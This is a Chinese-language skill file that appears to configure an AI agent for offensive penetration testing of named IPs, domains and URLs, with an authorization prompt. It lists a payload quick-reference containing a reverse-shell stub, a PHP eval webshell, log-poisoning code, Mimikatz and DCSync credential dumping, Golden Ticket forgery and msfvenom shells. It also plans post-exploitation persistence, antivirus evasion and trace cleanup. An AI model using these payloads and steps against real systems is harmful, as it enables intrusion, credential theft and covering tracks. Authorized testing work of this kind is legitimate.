---
name: secskills
description: >
  渗透测试实战技能。覆盖信息收集、漏洞发现、漏洞利用、后渗透全流程。
  当用户给出具体目标 (IP/域名/URL) 且意图是攻击/利用/拿权限时触发。
  不触发: 概念讨论、蓝队防御、代码审计、CVE文档查询。
allowed-tools: Read, Write, Bash, Grep, WebSearch, WebFetch, Glob, AskUserQuestion
argument-hint: <target_url_or_ip>
---

# 渗透测试实战技能

> 架构: Level 1 (frontmatter) → Level 2 (本文件) → Level 3 (references/)
> 覆盖: 信息收集 → Web漏洞 → 主机漏洞 → 后渗透 → 免杀

## 触发条件

**触发（全部满足）**:
1. 意图是攻击/利用/拿权限，非学习/防御/讨论
2. 给出具体目标: IP、域名、URL、端口、漏洞环境
3. 涉及: SQL注入/XSS/RCE/SSRF/文件上传/LFI/XXE/反序列化/提权/横向/免杀

**不触发（任一命中）**:
- "什么是XSS"、"怎么防御" → 普通问答
- 蓝队/应急响应/日志分析 → 非本Skill
- 代码优化/重构/业务bug → 普通编程
- "查CVE" → WebSearch
- AI Prompt注入/越狱 → secknowledge-skill
- 完整项目白盒审计 → code-audit-skill

**行为**: Skill 加载后正常待命；用户给出具体测试目标时 → 弹出 `AskUserQuestion` 方向键选择面板（授权/深度/范围），选择完成后进入测试流程。

## 行为准则（全程有效）

1. ❗ **授权优先** — 利用步骤输出前确认: 授权渗透 | 本人环境。无授权 → 只出分析，不出武器化Payload
2. ❗ **引用强制** — CVE/Payload 必须引用 `references/` 中文件章节。未覆盖 → `⚠️ UNABLE TO CITE`
3. ❗ **风险标注** — 漏洞标 🔴高/🟡中/🟢低 + 利用条件
4. ❗ **链式思维** — 优先输出利用链 (A→B→C)，非孤立漏洞
5. ❗ **命令可执行** — 所有命令完整可复制，IP/端口用 `<target>` 占位

## 幻觉防护

| 内容类型 | 正确 | 禁止 |
|---------|------|------|
| CVE 编号 | 引用 reference 或 `⚠️ UNABLE TO CITE` | 编造编号 |
| Payload | 从 `references/` 引用 | 凭记忆写 |
| 工具参数 | 标准 Kali 语法或 `references/` 记载 | 伪造参数 |
| 版本范围 | "Apache 2.4.0-2.4.49 (CVE-2021-41773)" | "所有版本" |
| 无匹配 | `⚠️ UNABLE TO ASSESS: 未覆盖，建议[行动]` | 凭经验断言 |

**标注**: `[引用:file:section]` · `⚠️ 通用知识` · `💡 方法论推理`

## 输出约束

- 禁止: 开场客套话、工具调用描述、已知信息复述、未授权武器化链
- 限制: 利用链 ≤3条/次、Payload ≤5条/类、表格/列表优先

## 工作流程

> 严格两阶段: [攻击阶段] Step 1+2 (发现与检测) → [利用阶段] Step 3+4 (武器化与后渗透)
> 两阶段引用隔离: 利用阶段只能引用攻击阶段已加载的 L2 文件，禁止跨阶段新增 reference
>
> ⚠️ **测试确认**: 当用户给出具体目标（IP/域名/URL）要开始测试时，必须先调用 `AskUserQuestion` 弹出交互式选择面板。
> 用户用 **↑↓ 方向键** 选择，**Enter** 确认，对话不中断。选择完成后再进入 Step 1。

### 🎯 测试确认（有目标时触发）

当用户给出具体测试目标时，使用 `AskUserQuestion` 一次性弹出以下 3 个问题：

**问题 1 — 授权级别:**
- Header: `授权级别`
- 选项:
  - `🔴 授权渗透` — 正式授权，完整利用链
  - `🟡 灰盒测试` — 有测试账号
  - `🟢 黑盒测试` — 无凭证，外部探测
  - `⚪ 本人环境` — 自建靶场/CTF

**问题 2 — 测试深度:**
- Header: `测试深度`
- 选项:
  - `标准测试` (推荐) — 全量漏洞检测+验证
  - `快速扫描` — 端口+指纹+常见PoC
  - `深度测试` — 含内网横向+后渗透
  - `仅信息收集` — 不利用

**问题 3 — 测试范围:**
- Header: `测试范围`
- 选项:
  - `仅主目标` — 只测给定目标
  - `含子域名` — 扩展子域名/子目录
  - `含关联资产` — C段/同ASN

> 选择完成后输出简短确认，立即进入 Step 1。如有测试账号，用户通过 "其他" 填写。

### 🔍 攻击阶段 — 发现与检测

**Step 1: 信息收集 + 攻击面识别**
- 分类目标 (Web/主机/内网/混合) → 按导航索引匹配 reference → 输出列表 L1
- 攻击面: 端口/服务/Web入口/认证/API/子域名
- ✅ `Step1: 类型={X}, 攻击面={N}项, |L1|={M}个reference`

**Step 2: 漏洞发现 + 知识加载**
- 按 L1 加载 reference，每次 ≤1000tokens → 记加载集合 L2 (L2 ⊆ L1)
- 每条漏洞假设标注: 🔴高/🟡中/🟢低 + 前提条件 + 检测命令
- 失败降级: Read重试1次 → Bash cat → 标 "不可读"移除
- ✅ `Step2: |L2|={M}, 漏洞假设={K}条`

> ⚠️ 攻击阶段不输出武器化 Payload，仅输出检测用 PoC

### ⚔️ 利用阶段 — 武器化与后渗透

**Step 3: 漏洞利用 + 链式组合**
- 从 L2 取利用 Payload → 可执行命令 → 优先构建利用链 (A→B→C→RCE)
- 每条利用必须引用 L2 中的具体 section，禁止重新搜索 reference
- ✅ `Step3: 利用链={N}条, 引用覆盖率={X}%`

**Step 4: 后渗透（按需触发）**
- 目标: 提权 / 横向移动 / 凭据窃取 / 域渗透 / 持久化 / 痕迹清理
- ✅ `Step4: 提权={X}, 横向={Y}条, 凭据={Z}组, 报告={已生成/未生成}`

## 场景导航索引

### 信息收集
| 场景 | reference |
|------|----------|
| 端口扫描+服务识别 | `references/info-port-scan.md` |
| 子域名枚举 | `references/info-subdomain.md` |
| 目录/文件爆破 | `references/info-dir-brute.md` |
| Web指纹/OSINT | `references/info-fingerprint.md` / `references/info-osint.md` |

### Web 漏洞 — 攻击阶段（检测与发现）

| 场景 | reference | 关键检测 |
|------|----------|---------|
| SQL 注入 | `references/web-sqli.md` | 闭合/报错/延时/OrderBy |
| XSS 跨站脚本 | `references/web-xss.md` | 反射/存储/DOM/CSP |
| 命令执行 RCE | `references/web-rce.md` | 拼接符/回显/不出网 |
| SSRF | `references/web-ssrf.md` | 内网探测/云元数据/Gopher |
| 文件上传 | `references/web-upload.md` | 后缀/内容/条件竞争 |
| 文件包含/路径遍历 | `references/web-lfi-path.md` | 伪协议/日志投毒/截断 |
| XXE 注入 | `references/web-xxe.md` | 文件读取/Blind/外带DTD |
| 反序列化 | `references/web-deser.md` | PHP/Java/Python gadget |
| 越权/逻辑漏洞 | `references/web-auth-logic.md` | IDOR/支付/密码重置/会话 |
| SSTI 模板注入 | `references/web-ssti.md` | Jinja2/Twig/FreeMarker |
| HTTP 请求走私 | `references/web-http-smuggling.md` | CL.TE/TE.CL/H2降级 |
| Host 头注入 | `references/web-host-header.md` | 密码重置投毒/缓存投毒 |
| 缓存投毒 | `references/web-cache-poison.md` | 非键化输入/响应篡改 |
| CORS 配置错误 | `references/web-cors.md` | Origin反射/Credentials |
| CRLF 注入 | `references/web-crlf.md` | 响应头注入/会话固定 |
| GraphQL | `references/web-graphql.md` | 内省/批量查询/深度递归 |

### Web 漏洞 — 利用阶段（武器化）

| 场景 | reference | 关键利用 |
|------|----------|---------|
| WAF/IDS 绕过 | `references/web-waf-bypass.md` | 编码/分块/HPP/协议走私 |

> 各漏洞利用Payload在对应reference的「利用阶段」section中，WAF绕过为利用阶段通用技巧

### 主机与后渗透
| 场景 | reference |
|------|----------|
| 密码爆破 | `references/host-brute.md` |
| Linux 提权 | `references/post-linux-privesc.md` |
| Windows 提权 | `references/post-win-privesc.md` |
| 凭据窃取+横向 | `references/post-credentials.md` |
| 域渗透 | `references/post-ad.md` |

### 免杀规避
| 场景 | reference |
|------|----------|
| Shellcode 混淆+加载器 | `references/evasion-shellcode.md` |

### 工具速查 (独立 tools/ 目录)
| 工具 | reference | 用途 |
|------|----------|------|
| Nmap | `references/tools-nmap.md` | 端口扫描+服务识别+NSE脚本 |
| SQLMap | `references/tools-sqlmap.md` | SQL注入自动化+文件读写+OS Shell |
| Metasploit | `references/tools-msf.md` | Payload生成+Meterpreter+后渗透模块 |
| Hydra | `references/tools-hydra.md` | 多协议密码爆破 |
| Impacket | `references/tools-impacket.md` | PTH/PTT/DCSync/横向移动 |
| Gobuster/ffuf | `references/tools-fuzz.md` | 目录爆破+VHOST+参数Fuzz |

### Payload 速查入口
| 目的 | 速查 | 详细 |
|------|------|------|
| SQLi Union | `' UNION SELECT ...--` | `web-sqli.md §2` |
| SQLi 报错 | `extractvalue/updatexml` | `web-sqli.md §3` |
| SQLi 盲注 | `IF(...SLEEP(3)...)` | `web-sqli.md §4` |
| XSS | `<script>alert(1)</script>` | `web-xss.md §1` |
| 反弹Shell | `bash -i >& /dev/tcp/x/x` | `web-rce.md §4` |
| SSRF 元数据 | `http://169.254.169.254/` | `web-ssrf.md §3` |
| 文件上传 PHP | `<?php @eval($_POST[1]);?>` | `web-upload.md §1` |
| LFI 日志投毒 | UA:`<?php system('id');?>` | `web-lfi-path.md §3` |
| SSRF→Redis RCE | Gopher 协议 | `web-ssrf.md §4` |
| Linux SUID | `find / -perm -4000` | `post-linux-privesc.md §2` |
| Win Token | Potato/PrintSpoofer | `post-win-privesc.md §6` |
| Mimikatz | `sekurlsa::logonpasswords` | `post-credentials.md §1` |
| PTH | `psexec.py -hashes :NTLM` | `post-credentials.md §4` |
| MSFvenom | `-p windows/x64/shell_reverse_tcp` | `evasion-shellcode.md §1` |
| XXE 文件读取 | `<!ENTITY xxe SYSTEM "file://...">` | `web-xxe.md §1` |
| SSTI Jinja2 RCE | `{{lipsum.__globals__...}}` | `web-ssti.md §2` |
| IDOR 检测 | 遍历ID/改资源标识符 | `web-auth-logic.md §1` |
| 支付逻辑篡改 | 改价格/数量/优惠券 | `web-auth-logic.md §4` |
| PHP 反序列化 | `O:N:"Class":N:{...}` | `web-deser.md §1` |
| Java ysoserial | `CommonsCollections5` | `web-deser.md §2` |
| Kerberoasting | `Rubeus kerberoast` | `post-ad.md §3` |
| DCSync | `mimikatz lsadump::dcsync` | `post-ad.md §5` |
| Golden Ticket | `krbtgt hash + domain sid` | `post-ad.md §6` |
| HTTP 请求走私 | `CL.TE / TE.CL 走私请求` | `web-http-smuggling.md §3` |
| Host 头投毒 | `密码重置链接劫持` | `web-host-header.md §2` |
| 缓存投毒XSS | `非键化header → 缓存篡改` | `web-cache-poison.md §2` |
| CORS 跨域窃取 | `Access-Control-Allow-Origin 反射` | `web-cors.md §2` |
| GraphQL 内省 | `__schema / __type` | `web-graphql.md §2` |

## 零结果处理

| 情况 | 动作 |
|------|------|
| 目标不可达 | `❌ UNABLE TO ASSESS: 目标无响应` |
| Reference 未覆盖 | `⚠️ UNABLE TO CITE: 建议 WebSearch [关键词]` |
| 无授权 | `仅检测方法，不输出武器化链。授权|本人环境?` |
| WAF拦截 | 加载 `web-waf-bypass.md` |
| 利用失败 | 检查版本→防护→替代Payload |

## 路由边界

| 诉求 | 路由 |
|------|------|
| 渗透/红队/提权 | **本 Skill** |
| AI/LLM 安全测试 | secknowledge-skill |
| 白盒代码审计 | code-audit-skill |
| 查CVE/文档 | WebSearch/Context7 |

---

*v1.2 | SecSkills | 架构: SKILL.md (L2) → references/ (L3) | 测试确认: AskUserQuestion 方向键选择*
